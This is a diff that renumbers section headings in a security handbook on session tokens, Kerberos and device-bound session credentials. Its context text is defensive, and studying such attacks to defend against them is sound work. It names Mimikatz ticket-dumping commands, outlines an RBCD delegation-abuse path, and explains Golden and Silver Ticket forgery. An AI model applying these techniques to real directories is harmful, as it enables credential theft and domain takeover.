+##### 37.3.5 Anti-Patterns: Common JWT Misuse
 
 **Using JWTs as long-lived session tokens** — JWTs with hours or days of validity maximise the revocation problem. A JWT with `Max-Age=86400` (24 hours) that is compromised grants the attacker a full day of access with no mechanism for the server to terminate the session. This anti-pattern typically arises when developers want to avoid maintaining a session store — "stateless sessions" — but the tradeoff is unacceptable for any application handling sensitive data.
 
@@ -41864,7 +41866,7 @@ The revocation strategy should be matched to the credential lifetime:
 
 The complete validation checklist is provided in the JWT Profile section (§37.3.2).
 
-##### 36.3.6 Opinionated Guidance
+##### 37.3.6 Opinionated Guidance
 
 Use JWTs as **short-lived access tokens** (5–15 minutes) validated by resource servers at the API layer. Use opaque session cookies — backed by a server-side session store — for **browser-facing session management**. Combine both through the BFF pattern (§35.2):
 
@@ -41879,7 +41881,7 @@ This architecture provides:
 - ✅ **Horizontal scalability** — the session store is the only stateful component; JWTs scale horizontally
 
 #### 37.4 Refresh Tokens: Rotation, Families, Absolute Expiry
-##### 36.4.1 Refresh Token Purpose
+##### 37.4.1 Refresh Token Purpose
 
 A refresh token is a long-lived credential that enables obtaining new access tokens without re-authenticating the user. When the current access token expires (after 5–15 minutes per §37.3.6), the client presents the refresh token to the authorization server's token endpoint and receives a fresh access token — without redirecting the user to a login page or requiring any user interaction.
 
@@ -41902,7 +41904,7 @@ For a 24-hour session with 5-minute access tokens: $N = \frac{86400}{300} = 288$
 | **Web Worker (in-memory)** | Medium — survives page navigation within SPA | ❌ Lost on tab close | Possible for SPAs with BFF fallback |
 | **WebAuthn-bound credential** | Very High — phishing-resistant, requires user gesture | ✅ Persistent | High-security applications with biometric re-auth
 
-##### 36.4.2 Refresh Token Rotation (RFC 9700)
+##### 37.4.2 Refresh Token Rotation (RFC 9700)
 
 Refresh token rotation — mandated by RFC 9700 (OAuth 2.0 Security Best Current Practice, January 2025) for public clients — is an automatic token theft detection mechanism. The protocol:
 
@@ -41915,7 +41917,7 @@ Refresh token rotation — mandated by RFC 9700 (OAuth 2.0 Security Best Current
 
 **Theft detection**: If an attacker steals RT₂ and uses it before the legitimate client does, the authorization server issues RT₃ to the attacker and invalidates RT₂. When the legitimate client subsequently tries to use RT₂, the request fails — but more importantly, the authorization server detects that an **already-rotated** refresh token has been presented. This is a definitive signal that the token was stolen (it was used by two different parties). The authorization server responds by revoking the **entire token family** — all refresh tokens derived from the original authorisation.
 
-##### 36.4.3 Token Families
+##### 37.4.3 Token Families
 
 All refresh tokens derived from a single authorization grant form a **token family** — a lineage chain tracked by the authorization server:
 
@@ -42083,7 +42085,7 @@ Content-Type: application/json
 
 This mechanism provides automatic compromise detection that bearer tokens inherently lack. The tradeoff: if the legitimate client's refresh request fails due to network issues (the server rotated the token but the client didn't receive the response), the client loses its refresh token. Implementations must handle this gracefully — typically by redirecting the user to re-authenticate.
 
-##### 36.4.4 Sender-Constrained Refresh Tokens
+##### 37.4.4 Sender-Constrained Refresh Tokens
 
 RFC 9700 offers an alternative to rotation for refresh token security: **sender constraining**. Instead of rotating the token on each use, the authorization server cryptographically binds the refresh token to the client instance that requested it:
 
@@ -42092,7 +42094,7 @@ RFC 9700 offers an alternative to rotation for refresh token security: **sender 
 
 Sender-constrained refresh tokens provide stronger security than rotation — a stolen token cannot be used at all, even once — but require the client to manage cryptographic key material (DPoP key pair or TLS certificate). For confidential clients (BFF — §35.2), sender constraining via mTLS or DPoP is the recommended approach. For public clients (native mobile apps, SPAs), rotation remains the pragmatic choice because public clients cannot securely maintain long-lived key material.
 
-##### 36.4.5 Absolute Expiry
+##### 37.4.5 Absolute Expiry
 
 Refresh token rotation enables indefinite session extension — each rotation produces a new refresh token with a fresh `exp`, creating an infinite chain of renewable tokens. Without an absolute expiry constraint, a user who logged in once could maintain their session forever through continuous token rotation, never re-authenticating.
 
@@ -42150,7 +42152,7 @@ The preceding sections examined each token type in isolation. This section provi
 | **Primary standard** | RFC 6265bis | RFC 7662, RFC 7009 | RFC 7519, RFC 9068 | RFC 6749, RFC 9700 |
 | **Best for** | Browser → server session (BFF frontend) | High-security APIs requiring instant revocation; Phantom Token pattern (§35.4) | Microservice-to-microservice API calls; stateless horizontal scaling | Session continuity — obtaining new access tokens without re-authentication |
 
-##### 36.5.1 Token Type Selection Decision Framework
+##### 37.5.1 Token Type Selection Decision Framework
 
 The following decision table maps common requirements to the recommended token type:
 
@@ -42177,7 +42179,7 @@ Token types are rarely used in isolation. The following table documents common i
 | Enhanced security | JWT + DPoP proof (AT) + DPoP-bound RT | All tokens sender-constrained via DPoP |
 | SSO federation | SSO cookie + local JWT session | SSO cookie triggers token exchange; local JWT used for APIs |
 
-##### 36.5.2 Architectural Context Recommendations
+##### 37.5.2 Architectural Context Recommendations
 
 | Architecture | Token Strategy |
 |:-------------|:---------------|
@@ -42199,7 +42201,7 @@ The following table provides a more detailed comparison across architectures, in
 | Microservice internal | JWT (5 min) | HTTP header + mTLS | Not used | N/A (re-auth) | mTLS / SPIFFE |
 | API Gateway + Phantom | Opaque (client), JWT (internal) | Cookie (client), header (internal) | Opaque (8h) | Immediate | mTLS / DPoP |
 
-##### 36.5.3 Decentralized Capability Tokens: Biscuits, Macaroons, and UCANs
+##### 37.5.3 Decentralized Capability Tokens: Biscuits, Macaroons, and UCANs
 
 The token types covered in §37.1–§37.3 (cookies, opaque tokens, JWTs) and the architectural patterns in §37.5.2 all share a common constraint: **the issuer is a centralized Authorization Server, and every delegation or scope change requires a round-trip to that server.** OAuth 2.0 Token Exchange (RFC 8693) can broker delegation between parties, but the AS remains the mandatory intermediary for each hop.
 
@@ -42207,7 +42209,7 @@ Decentralized capability tokens offer an alternative paradigm: **offline attenua
 
 The three systems examined here — Macaroons, Biscuits, and UCANs — each implement offline attenuation differently, with distinct cryptographic models, policy languages, and revocation strategies.
 
-##### 36.5.3.1 Macaroons: Symmetric HMAC Caveat Chaining
+##### 37.5.3.1 Macaroons: Symmetric HMAC Caveat Chaining
 
 Macaroons (Birgisson et al., NDSS 2014) pioneered the offline attenuation model by combining a bearer credential with a chain of cryptographically bound caveats. The token holder can append new restrictions — called *first-party caveats* — by computing a new HMAC over the previous signature and the caveat text. The resulting token is self-contained: the verifier recomputes the HMAC chain from the shared root key and evaluates every caveat in sequence.
 
@@ -42233,7 +42235,7 @@ The verifier recomputes this chain from the shared root key. If any caveat is re
 
 **Production use and limitations.** Macaroons have seen limited production adoption. Google's Turbinia forensic automation framework and Apache Cassandra have been cited in academic literature, but neither represents a current, widely-deployed integration. The symmetric key model is the primary drawback: every verifying server must hold the root secret, which complicates key rotation and violates the principle of minimal secret distribution. Revocation requires external mechanisms — typically short TTLs or explicit blocklists — as the token format has no native revocation support.
 
-##### 36.5.3.2 Biscuits: Asymmetric Datalog Policy Tokens
+##### 37.5.3.2 Biscuits: Asymmetric Datalog Policy Tokens
 
 Biscuits (Clever Cloud) extend the Macaroon paradigm in two fundamental ways: they replace symmetric HMAC chaining with **asymmetric Ed25519 signatures** (eliminating shared secret distribution), and they replace string-based caveats with a **Datalog policy language** (enabling declarative, queryable authorization rules).
 
@@ -42316,7 +42318,7 @@ Check: source_ip('192.168.1.5')`"]
     style B2 text-align:left
 ```
 
-##### 36.5.3.3 UCANs: DID-Based Decentralized Capabilities
+##### 37.5.3.3 UCANs: DID-Based Decentralized Capabilities
 
 UCANs (User-Controlled Authorization Network) invert the traditional authorization model: instead of a central issuer granting tokens to subjects, **users delegate capabilities they control to other principals** using self-sovereign cryptographic identities. UCANs package capabilities as standard JWTs bound to Decentralized Identifiers (DIDs), enabling trustless verification without any central registry or authorization server.
 
@@ -42396,7 +42398,7 @@ flowchart LR
     style IPFS text-align:left
 ```
 
-##### 36.5.3.4 Comparative Analysis
+##### 37.5.3.4 Comparative Analysis
 
 The following table compares the three decentralized capability systems against the token types already covered in §37.1–§37.3 and the sender-constrained mechanisms in §3.6:
 
@@ -42415,7 +42417,7 @@ The following table compares the three decentralized capability systems against 
 
 The key trade-off is clear: **OAuth bearer tokens and sender-constrained variants (DPoP, mTLS) offer ecosystem breadth and mature operational tooling, while decentralized capability tokens offer offline attenuation and delegation depth that OAuth cannot match without AS round-trips.** For the multi-agent delegation chains described in §24 and §39.3, UCANs currently have the strongest production trajectory, while Biscuits offer the most rigorous formal verification properties.
 
-##### 36.5.3.5 Session Management Applications
+##### 37.5.3.5 Session Management Applications
 
 Decentralized capability tokens introduce a distinct session management model compared to the cookie and JWT patterns in §37.1–§37.3:
 
@@ -42430,7 +42432,7 @@ Decentralized capability tokens introduce a distinct session management model co
 #### 37.6 Security Considerations and Threat Model
 The comparison matrix (§37.5) and architecture recommendations (§37.5.2) address token selection for specific architectures. This section provides a cross-cutting threat analysis that applies regardless of architecture.
 
-##### 36.6.1 Threat Matrix by Token Type
+##### 37.6.1 Threat Matrix by Token Type
 
 | Threat | Cookie | Opaque Token | JWT | Refresh Token |
 |:-------|:-------|:-------------|:----|:--------------|
@@ -42444,7 +42446,7 @@ The comparison matrix (§37.5) and architecture recommendations (§37.5.2) addre
 
 The most actionable finding: JWTs are uniquely vulnerable to side-channel token leakage via application logs. Unlike opaque tokens and cookies (which are small, random strings), JWTs contain full claims in base64url-encoded form. If a JWT appears in an application log, access log, or error report, the entire session metadata is exposed. Token logging guidance (§37.6.2) addresses this directly.
 
-##### 36.6.2 Token Logging Guidance
+##### 37.6.2 Token Logging Guidance
 
 Tokens must never appear in application logs. This applies to all token types:
 
@@ -42463,7 +42465,7 @@ logger.info(f"Token validated: jti=\{claims['jti']\}, sub=\{claims['sub']\}, exp
 logger.info(f"Token received: \{bearer_token\}")
 ```
 
-##### 36.6.3 Token Lifetime Risk Estimation
+##### 37.6.3 Token Lifetime Risk Estimation
 
 The following formula provides a risk estimate based on token lifetime and exposure frequency:
 
@@ -42479,7 +42481,7 @@ The key insight: **halving the token lifetime approximately halves the risk expo
 #### 37.7 Implementation Checklist
 The following checklists provide a comprehensive reference for implementing session token systems correctly. Each checklist covers a specific token type and should be used as a pre-deployment validation guide.
 
-##### 36.7.1 Cookie Configuration Checklist
+##### 37.7.1 Cookie Configuration Checklist
 
 - [ ] All session cookies use the `__Host-` prefix (or `__Secure-` if `Domain` is required)
 - [ ] `Secure` attribute is set on all cookies (no HTTP transmission)
@@ -42491,7 +42493,7 @@ The following checklists provide a comprehensive reference for implementing sess
 - [ ] Cookie values do not exceed 4,096 bytes
 - [ ] Total cookies per domain stay under browser limits (~150 per domain)
 
-##### 36.7.2 JWT Implementation Checklist
+##### 37.7.2 JWT Implementation Checklist
 
 - [ ] Token lifetime does not exceed 5 minutes for access tokens
 - [ ] `exp` claim is always present (reject tokens without it)
@@ -42505,7 +42507,7 @@ The following checklists provide a comprehensive reference for implementing sess
 - [ ] `jti` claim is included for replay detection in high-security contexts
 - [ ] Revocation mitigation strategy is implemented (short TTL, blacklist, version claim, or phantom token)
 
-##### 36.7.3 Refresh Token Implementation Checklist
+##### 37.7.3 Refresh Token Implementation Checklist
 
 - [ ] Refresh tokens are rotated on every use (RFC 9700)
 - [ ] Token family tracking is implemented for theft detection
@@ -42517,7 +42519,7 @@ The following checklists provide a comprehensive reference for implementing sess
 - [ ] Security alerts are triggered on reuse detection
 - [ ] Refresh token storage is encrypted at rest
 
-##### 36.7.4 Opaque Token Implementation Checklist
+##### 37.7.4 Opaque Token Implementation Checklist
 
 - [ ] Tokens have minimum 128 bits of entropy (256 bits recommended)
 - [ ] Token introspection endpoint is implemented per RFC 7662
@@ -42560,7 +42562,7 @@ This chapter provides a protocol-level deep dive into Kerberos — covering the 
 | **kadmin** | 749/TCP | Kerberos | Remote administration (MIT/Heimdal KDCs) |
 | **KDC proxy** | 80/TCP, 443/TCP | HTTP | KDC proxy (RFC 6111) for firewall traversal |
 
-##### 37.1.1 Protocol Overview
+##### 38.1.1 Protocol Overview
 
 Kerberos v5 is a **trusted third-party authentication protocol**. Three principals participate in every authentication:
 
@@ -42615,7 +42617,7 @@ flowchart TD
     style SPN2 text-align:left
 ```
 
-##### 37.1.2 Three-Phase Kerberos Exchange
+##### 38.1.2 Three-Phase Kerberos Exchange
 
 ```mermaid
 ---
@@ -42848,7 +42850,7 @@ The **Service** formally returns an AP-REP cleanly if explicitly requested (RFC 
 
 </details>
 
-##### 37.1.3 Ticket Structure
+##### 38.1.3 Ticket Structure
 
 A Kerberos ticket encapsulates all information needed for the service to authenticate the client and make authorization decisions. In the ASN.1 encoding (RFC 4120 §9.3.1):
 
@@ -42893,7 +42895,7 @@ Key ticket flags and their significance:
 | **requestor** | 0x00040000 | Ticket requester is different from ticket client (S4U) |
 | **canonicalize** | 0x00010000 | KDC should canonicalise the principal name (used in cross-realm referral) |
 
-##### 37.1.4 Ticket Lifetime and Renewal
+##### 38.1.4 Ticket Lifetime and Renewal
 
 Active Directory defines Kerberos ticket lifetimes through Group Policy configuration:
 
@@ -42908,7 +42910,7 @@ Active Directory defines Kerberos ticket lifetimes through Group Policy configur
 Tickets can be renewed (if the `renewable` flag is set) by presenting the ticket to the TGS before it expires. The TGS issues a new ticket with an updated `endtime`, up to the `renew-till` value. This mechanism supports long-running sessions (e.g., persistent SSH connections, database connections) without requiring re-authentication.
 
 #### 38.2 Pre-Authentication and FAST (RFC 6113)
-##### 37.2.1 Pre-Authentication: Preventing Offline Attacks
+##### 38.2.1 Pre-Authentication: Preventing Offline Attacks
 
 Pre-authentication is the mechanism that prevents offline dictionary attacks against the KDC. The necessity arises from a fundamental protocol property:
 
@@ -42932,7 +42934,7 @@ Active Directory enables pre-authentication by default for all user accounts. Ho
 - **Enforce AES256 encryption** on all accounts — this prevents legacy RC4-based offline cracking, significantly raising the bar for AS-REP Roasting attacks
 - **Monitor Event ID 4768** on domain controllers for AS-REQ events with Failure Code 0x0 and Pre-Authentication Type 0 (no pre-auth)
 
-##### 37.2.2 PKINIT (RFC 4556)
+##### 38.2.2 PKINIT (RFC 4556)
 
 PKINIT — Public Key Cryptography for Initial Authentication in Kerberos — replaces the password-based pre-authentication with X.509 certificate-based authentication. The client presents an X.509 certificate and signs the pre-authentication data with the corresponding private key. The KDC validates the certificate chain against the domain's trusted certificate authorities and extracts the user's identity from the certificate's Subject Alternative Name (SAN).
 
@@ -42954,7 +42956,7 @@ PKINIT eliminates the password entirely from the Kerberos authentication process
 | **RSA mode** | No key exchange | Full chain + CRL/OCSP | Legacy; session key encrypted with KDC certificate's public key |
 | **Anonymous PKINIT** | DH/ECDH | KDC certificate only | Client authenticates without identity (rare) |
 
-##### 37.2.3 FAST: Flexible Authentication Secure Tunneling (RFC 6113)
+##### 38.2.3 FAST: Flexible Authentication Secure Tunneling (RFC 6113)
 
 FAST — also called **Kerberos Armoring** in Microsoft documentation — encrypts the entire pre-authentication exchange within a TGS session key, creating an encrypted tunnel that protects the password-derived key material from interception and offline attack.
 
@@ -43009,7 +43011,7 @@ $$K_{\text{AES}} = \text{random-to-key}(\text{DK}(\text{base-key}, \text{"kerber
 
 where `DK` is a PBKDF2-like key derivation function iterating 4096 times. This ensures the same password produces different keys for different principals, prevents rainbow table attacks, and makes offline cracking computationally expensive.
 
-##### 37.3.1 The RC4-HMAC Problem
+##### 38.3.1 The RC4-HMAC Problem
 
 RC4-HMAC (etype 23) deserves special attention because of a critical design flaw: the Kerberos encryption key for RC4-HMAC is the **NTLM hash** itself — the MD4 hash of the user's Unicode password. This means:
 
@@ -43042,7 +43044,7 @@ Microsoft began deprecating RC4-HMAC in Windows 11 24H2 and Windows Server 2025.
 | AD minimum version | Pre-2008 | All | Server 2003 | Server 2003 | Server 2016 |
 | Recommended | ❌ No | ❌ No | ✅ Acceptable | ✅ Yes | ✅ Preferred |
 
-##### 37.3.2 `krbtgt` Key and Golden Ticket Attacks
+##### 38.3.2 `krbtgt` Key and Golden Ticket Attacks
 
 The `krbtgt` account's encryption key protects every TGT in the domain — every TGT is encrypted with this key, and only the KDC possesses it. The `krbtgt` account resides in the `CN=Users` container of every AD domain, has a randomly generated 256-character password (never used for interactive logon), and has its password changed automatically by the KDC service every 30 days on Windows Server 2012+. Its Service Principal Name is `krbtgt/&lt;realm>`.
 
@@ -43113,7 +43115,7 @@ flowchart TD
     style G3 text-align:left
 ```
 
-##### 37.3.3 Encryption Type Configuration
+##### 38.3.3 Encryption Type Configuration
 
 In Active Directory, encryption types are configured at multiple levels:
 
@@ -43140,7 +43142,7 @@ Get-ADUser -Filter * -Properties msDS-SupportedEncryptionTypes |
 ```
 
 #### 38.4 PAC Validation and Constrained Delegation (S4U2Self, S4U2Proxy)
-##### 37.4.1 Privilege Attribute Certificate (PAC)
+##### 38.4.1 Privilege Attribute Certificate (PAC)
 
 The PAC is a Microsoft-proprietary authorization data structure defined in [MS-PAC] that is embedded within Kerberos tickets to carry the user's Windows-specific security information. Despite its name, the PAC is **not an X.509 certificate** — it is a structured data blob placed inside the `authorization-data` field of the ticket's `EncTicketPart`. The PAC contains:
 
@@ -43206,7 +43208,7 @@ flowchart LR
     style SPN text-align:left
 ```
 
-##### 37.4.2 PAC Vulnerability History
+##### 38.4.2 PAC Vulnerability History
 
 The PAC contains two digital signatures that provide integrity verification — a Server Signature and a KDC Signature:
 
@@ -43230,7 +43232,7 @@ The PAC's signature validation has been the target of critical vulnerabilities:
 
 **Mitigation:** Patch immediately; reduce `ms-DS-MachineAccountQuota` to 0; monitor for machine account creation and `sAMAccountName` changes.
 
-##### 37.4.3 Kerberos Delegation Models
+##### 38.4.3 Kerberos Delegation Models
 
 Kerberos delegation allows a service to impersonate the client and access other services on the client's behalf — a critical requirement for multi-tier applications (e.g., a web server that accesses a SQL server on behalf of the user).
 
@@ -43264,7 +43266,7 @@ RBCD — introduced in Windows Server 2012 — inverts the configuration model. 
 - **Administrative advantage:** The resource owner controls delegation permissions — they do not need Domain Admin privileges to configure delegation (unlike traditional constrained delegation, which requires modifying the delegating service's `msDS-AllowedToDelegateTo`)
 - **Security risk:** RBCD introduced a new attack vector — an attacker who can modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a computer object (achievable via GenericAll/GenericWrite ACE, or by compromising a privileged account) can configure delegation to themselves and impersonate any user to the target service. The RBCD abuse attack path: (1) obtain write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target → (2) set the attacker's account as an allowed delegate → (3) use S4U2Self + S4U2Proxy to access the target as any user → (4) common targets include computer accounts (CIFS/RDP) and service accounts (MSSQL). Key security differences from unconstrained delegation: no forwardable TGT is included in the service ticket (limiting scope), and the front-end service never receives the client's TGT — only a forwardable service ticket to the specific back-end
 
-##### 37.4.4 Delegation Comparison
+##### 38.4.4 Delegation Comparison
 
 | Dimension | Unconstrained | Constrained (S4U) | Resource-Based Constrained (RBCD) |
 |:----------|:--------------|:-------------------|:---------------------------------|
@@ -43278,7 +43280,7 @@ RBCD — introduced in Windows Server 2012 — inverts the configuration model. 
 | **AD minimum version** | Windows 2000 | Windows Server 2003 | Windows Server 2012 |
 | **Recommendation** | ❌ **Never use in new deployments** | ✅ Acceptable with strict SPN scoping | ✅ **Preferred model** |
 
-##### 37.4.5 Delegation Best Practices
+##### 38.4.5 Delegation Best Practices
 
 1. **Never use unconstrained delegation** in new deployments. Migrate existing unconstrained delegation to RBCD
 2. **Prefer RBCD** over traditional constrained delegation — it shifts control to the resource owner and requires fewer Domain Admin privileges
@@ -43290,11 +43292,11 @@ RBCD — introduced in Windows Server 2012 — inverts the configuration model. 
 **Kerberos TGT protection: Pass-the-Ticket and Credential Guard.** The Kerberos TGT is stored in LSASS process memory on Windows domain-joined machines. Privileged attackers can extract TGTs and TGS tickets from LSASS via credential dumping tools (e.g., Mimikatz `sekurlsa::kerberos` or `kerberos::ptt`) and replay them on other machines — this is the **Pass-the-Ticket** attack. Unlike credential theft (where the attacker obtains the password or hash), Pass-the-Ticket reuses a valid Kerberos ticket directly — the ticket's remaining lifetime is the attacker's window of access. Windows Credential Guard mitigates this by isolating LSASS secrets in a Hyper-V-enforced virtualization-based security (VBS) enclave. When Credential Guard is enabled, Kerberos keys and TGT material reside in a protected LSA process that even kernel-level code cannot access — preventing Pass-the-Ticket, Pass-the-Hash, and other memory-based credential extraction techniques. Credential Guard is available on Windows 10 Enterprise/Education and Windows Server 2016+ and is a core component of Microsoft's credential protection strategy (see §38.5.5 for the hybrid identity trajectory).
 
 #### 38.5 Kerberos in Hybrid Identity (AD and Entra ID)
-##### 37.5.1 The Hybrid Challenge
+##### 38.5.1 The Hybrid Challenge
 
 Modern enterprises operate in a hybrid identity landscape: on-premises Active Directory (Kerberos, NTLM) coexists with cloud Entra ID (OIDC, OAuth 2.0). Users authenticate to Microsoft 365, SaaS applications, and custom cloud apps via Entra ID, but still need Kerberos tickets for on-premises file shares, intranet web applications, SQL Server databases, and line-of-business applications that have no cloud migration path. The hybrid identity architecture bridges these two authentication worlds.
 
-##### 37.5.2 Entra Connect and Authentication Methods
+##### 38.5.2 Entra Connect and Authentication Methods
 
 **Entra Connect** (formerly Azure AD Connect) synchronizes user objects from on-premises AD to Entra ID. Three authentication methods determine how user credentials are validated:
 
@@ -43310,7 +43312,7 @@ Modern enterprises operate in a hybrid identity landscape: on-premises Active Di
 | **PTA** | Yes (PTA agent validates via Kerberos/NTLM to DC) | No (Entra ID issues JWTs) | Entra ID STS | Medium (PTA agent forwards to on-prem DC) | Limited (depends on PTA agent availability) |
 | **Federation (AD FS)** | Yes (AD FS uses Kerberos to validate to DC) | No (AD FS issues SAML/JWT) | AD FS STS | Higher (additional STS hop) | Yes (AD FS can be configured for cached auth) |
 
-##### 37.5.3 Seamless SSO (Desktop SSO)
+##### 38.5.3 Seamless SSO (Desktop SSO)
 
 Seamless SSO enables domain-joined Windows devices to silently authenticate to Entra ID using their existing Kerberos TGT — the user experiences a seamless transition from on-premises Kerberos to cloud OIDC without entering credentials:
 
@@ -43326,7 +43328,7 @@ This bridges the Kerberos and OIDC worlds: the user's on-premises Kerberos TGT b
 
 **Critical security requirement:** The `AZUREADSSOACC` computer account's Kerberos decryption key must be rotated at minimum every 30 days (Microsoft's recommendation). If this key is compromised, an attacker can forge Kerberos service tickets that Entra ID will accept — effectively executing a **Silver Ticket attack against the cloud**. The attacker can impersonate any user to Entra ID without knowing their password, bypassing MFA if Seamless SSO is configured to bypass MFA for domain-joined devices. The account password can be rolled using `Set-AzureADSSOAccountPassword` if compromise is suspected.
 
-##### 37.5.4 Kerberos Cloud Trust for Windows Hello for Business
+##### 38.5.4 Kerberos Cloud Trust for Windows Hello for Business
 
 Windows Hello for Business (WHfB) enables passwordless authentication using platform-bound credentials (§14.7). In hybrid environments, WHfB users need Kerberos TGTs for on-premises resource access. Three deployment models exist:
 
@@ -43350,7 +43352,7 @@ $$\text{User PIN/Biometric} \rightarrow \text{Device Key Pair} \rightarrow \text
 
 Cloud trust represents Microsoft's convergent direction: cloud-native authentication (passkeys, WHfB) as the primary mechanism, with Kerberos used transparently as a backward-compatible bridge for legacy on-premises applications.
 
-##### 37.5.5 Long-Term Trajectory
+##### 38.5.5 Long-Term Trajectory
 
 Kerberos will remain operationally necessary as long as on-premises Windows applications exist. Microsoft's strategy is progressive Kerberos dependency reduction:
 
@@ -43460,11 +43462,11 @@ Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...
 </details>
 
 #### 38.6 Cross-Realm Authentication
-##### 37.6.1 Cross-Realm Trust Architecture
+##### 38.6.1 Cross-Realm Trust Architecture
 
 Kerberos enables users in one realm (domain) to access services in another realm through **trust relationships** between the domains' KDCs. A trust relationship is established by sharing an **inter-realm key** between the two KDCs — a symmetric cryptographic key that both KDCs know and use to encrypt cross-realm referral tickets.
 
-##### 37.6.2 Trust Types in Active Directory
+##### 38.6.2 Trust Types in Active Directory
 
 | Trust Type | Direction | Transitivity | Automatic | Use Case |
 |:-----------|:----------|:-------------|:----------|:---------|
@@ -43475,7 +43477,7 @@ Kerberos enables users in one realm (domain) to access services in another realm
 | **Realm** (MIT Kerberos) | One-way or two-way | Non-transitive or transitive | ❌ Manual | Between AD and non-Windows MIT Kerberos realms (e.g., Linux/Unix environments running MIT KDC) |
 | **Shortcut** | One-way or two-way | Transitive | ❌ Manual | Within a forest — optimizes authentication paths between domains that are separated by multiple parent-child trust hops |
 
-##### 37.6.3 Cross-Realm Referral Mechanism
+##### 38.6.3 Cross-Realm Referral Mechanism
 
 When a client in Realm A requests a service ticket for a service in Realm B, the KDCs use a referral chain:
 
@@ -43489,7 +43491,7 @@ $$\text{TGT}_{B} = E_{K_{\text{inter-realm}}(A \leftrightarrow B)}(\text{EncTick
 
 In multi-hop trust paths (e.g., Realm A → Realm B → Realm C), the referral chain traverses each intermediate realm — the client receives a referral TGT for each hop until it reaches the realm containing the target service. **Shortcut trusts** optimize this by providing a direct inter-realm key between non-adjacent realms, reducing the number of referral hops.
 
-##### 37.6.4 Security Considerations
+##### 38.6.4 Security Considerations
 
 **Inter-realm key compromise:** Inter-realm trust keys are symmetric — both KDCs possess the key. When a trust is established between Domain A and Domain B, a trust account is created in each domain (e.g., `B$@A` and `A$@B`), and the inter-realm key is derived from this trust account's password. Trust passwords are rotated every 30 days by default on Server 2012+. Compromise of an inter-realm key allows forging cross-realm referral TGTs (an **inter-realm Golden Ticket**). The attacker can construct referral TGTs claiming any user identity from the trusted realm. Trust key rotation and monitoring are critical.
 
@@ -43505,7 +43507,7 @@ In multi-hop trust paths (e.g., Realm A → Realm B → Realm C), the referral c
 | **Selective Authentication** | Per-resource | Requires explicit "Allowed to Authenticate" ACE on each resource before trusted users can access it | Enabled during trust creation |
 | **No filtering** | Trust-wide | All SIDs pass through — trusting domain fully accepts the trusted domain's SID claims | Not recommended; possible on non-Windows trusts |
 
-##### 37.6.5 Cross-Realm Security Recommendations
+##### 38.6.5 Cross-Realm Security Recommendations
 
 1. **Use forest trusts over external trusts** — Forest trusts provide transitive trust relationships, are easier to manage, and include SID filtering by default.
 2. **Enable SID filtering on all trusts** — Never disable SID filtering unless absolutely required for legacy application compatibility. Disabling SID filtering exposes the trusting domain to SID history attacks.
@@ -43540,7 +43542,7 @@ The threat model for bearer token theft is not theoretical — it is the primary
 | **Physical device access** | Low — targeted attacks | Full credential extraction | Very Low |
 
 #### 39.1 Device Bound Session Credentials (DBSC): Chrome/Google Proposal
-##### 38.1.1 The Cookie Theft Problem
+##### 39.1.1 The Cookie Theft Problem
 
 Session cookies remain the dominant session management mechanism for browser-based applications (§37.1). They are also the primary target for credential theft at scale. Info-stealer malware — Raccoon, Vidar, RedLine, Lumma — specifically targets browser cookie databases, extracting session cookies that grant access to authenticated sessions without requiring any further authentication. The threat model is straightforward:
 
@@ -43595,7 +43597,7 @@ flowchart TD
     style S3 text-align:left
 ```
 
-##### 38.1.2 DBSC Concept
+##### 39.1.2 DBSC Concept
 
 Device Bound Session Credentials (DBSC) is a web platform API and protocol — developed by Google and now standardised through the W3C Web Application Security Working Group — that binds session cookies to a cryptographic key pair stored in the browser's platform authenticator. The binding ensures that a stolen cookie is useless without the device's private key:
 
@@ -43606,7 +43608,7 @@ Device Bound Session Credentials (DBSC) is a web platform API and protocol — d
 
 The critical security property: even if malware exfiltrates every cookie from the browser's database, the private key remains locked in hardware-backed storage. The cookies are inert on any device other than the one that created the session.
 
-##### 38.1.3 Key Generation and TPM Integration
+##### 39.1.3 Key Generation and TPM Integration
 
 DBSC relies on the platform's hardware-backed key storage for private key protection. The choice of TPM or TEE has implications for both security and portability:
 
@@ -43630,7 +43632,7 @@ The key generation process:
 4. Key identifier (public key thumbprint) stored for subsequent binding
 5. Private key tagged with application-bound usage restriction (browser-only)
 
-##### 38.1.4 DBSC Protocol Flow
+##### 39.1.4 DBSC Protocol Flow
 
 DBSC operates through a registration and refresh cycle that integrates with the server's existing session management:
 
@@ -43863,7 +43865,7 @@ WWW-Authenticate: DPoP error="invalid_dpop_proof"
 
 </details>
 
-##### 38.1.5 Implementation Status
+##### 39.1.5 Implementation Status
 
 DBSC has progressed from a Google-internal proposal to a shipping web platform feature:
 
@@ -43884,7 +43886,7 @@ DBSC has progressed from a Google-internal proposal to a shipping web platform f
 
 As of March 2026, DBSC is available in Chrome 145+ (enabled by default for compatible origins) and in experimental builds of Firefox. Safari support remains under development in WebKit. Server-side adoption is concentrated among large-scale web properties (Google, Microsoft, Cloudflare) with open-source implementations emerging.
 
-##### 38.1.6 Privacy Design
+##### 39.1.6 Privacy Design
 
 DBSC is designed to avoid creating new tracking vectors:
 
@@ -43902,7 +43904,7 @@ $$\forall\, r \in \text{Requests}: \text{is\_cross\_site}(r) \implies \neg \text
 
 The first constraint enforces per-origin key isolation (preventing cross-origin tracking via key fingerprinting). The second ensures that clearing browsing data destroys the associated keys. The third guarantees that DBSC proofs are never attached to cross-site requests.
 
-##### 38.1.7 Limitations and Open Challenges
+##### 39.1.7 Limitations and Open Challenges
 
 Despite its promise, DBSC has several limitations that constrain its applicability:
 
@@ -43917,7 +43919,7 @@ Despite its promise, DBSC has several limitations that constrain its applicabili
 5. **Backup and recovery** — TPM-bound keys cannot be backed up. If a user's hardware fails, they must re-register and create a new session. This is acceptable for short-lived sessions but problematic for long-lived persistent logins.
 
 #### 39.2 Token Binding (RFC 8471): Historical Context
-##### 38.2.1 The Token Binding Protocol
+##### 39.2.1 The Token Binding Protocol
 
 Token Binding (RFC 8471, 8472, 8473 — October 2018) was the first standardised attempt to cryptographically bind security tokens to client devices. The protocol operated at the **TLS layer**, integrating token binding negotiation directly into the TLS handshake:
 
@@ -43932,7 +43934,7 @@ Token Binding (RFC 8471, 8472, 8473 — October 2018) was the first standardised
 
 The critical integration point is step 3: the token binding key is bound to the TLS handshake transcript. This means the key cannot be used on a different TLS connection, even if the key material is somehow extracted, because the TLS handshake transcript (which includes client and server random values, cipher suite negotiation, and certificates) is unique per connection.
 
